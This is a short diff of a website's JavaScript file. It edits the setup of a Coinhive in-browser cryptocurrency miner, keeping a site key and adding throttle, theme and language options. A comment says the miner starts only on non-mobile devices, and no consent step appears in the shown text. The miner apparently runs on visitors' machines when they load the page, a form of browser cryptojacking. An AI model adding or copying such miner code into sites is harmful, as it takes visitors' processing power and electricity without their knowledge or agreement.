@@ -41,8 +41,12 @@ function menuClick() {
 menuClick();
 
 
-//Coinhive script
-var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log');
+//Coinhive scripts
+var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log', {
+	throttle: 0.6,
+	theme: 'light',
+	language: 'auto'
+});
 
 // Only start on non-mobile devices
 if (!miner.isMobile()) {
